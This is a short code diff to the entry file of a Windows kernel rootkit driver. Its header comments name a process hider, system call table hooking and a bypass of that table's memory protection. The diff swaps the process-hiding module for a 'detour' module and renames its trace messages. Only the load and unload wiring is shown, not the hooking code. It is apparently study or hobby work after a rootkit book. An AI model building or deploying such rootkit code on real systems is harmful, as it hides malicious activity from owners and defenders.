@@ -7,17 +7,19 @@
 // v0.6 - Added way around system call table memory protection, Jamie Butler (butlerjr@acm.org)
 // v1.0 - Trimmed code back to a process hider for the book.
 
-#include "hookssdt.h"
-#include "dkomeprocess.h"
+//#include "hookssdt.h"
+//#include "dkomeprocess.h"
 //#include "idthook.h"
+#include "detour.h"
 
 VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
 {
-	Ktrace("ROOTKIT: OnUnload called\n");
+	Ktrace("(MYRKT)OnUnload called\n");
 	
 	//DE_OnUnload(DriverObject);
 	//IH_OnUnload(DriverObject);
-	Hp_OnUnload(DriverObject);
+	//Hp_OnUnload(DriverObject);
+	DT_OnUnload(DriverObject);
 	
 	return;
 }
@@ -28,12 +30,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
    // Register a dispatch function for Unload
    theDriverObject->DriverUnload  = OnUnload; 
 
-   Ktrace("ROOTKIT: Onload called\n");
+   Ktrace("(MYRKT)Onload called\n");
 
    NTSTATUS status = STATUS_SUCCESS;
    //status = DE_Onload(theDriverObject, theRegistryPath);
    //status = IH_Onload(theDriverObject, theRegistryPath);
-   status = Hp_Onload(theDriverObject, theRegistryPath);
+   //status = Hp_Onload(theDriverObject, theRegistryPath);
+   status = DT_Onload(theDriverObject, theRegistryPath);
    
    return status;
 }
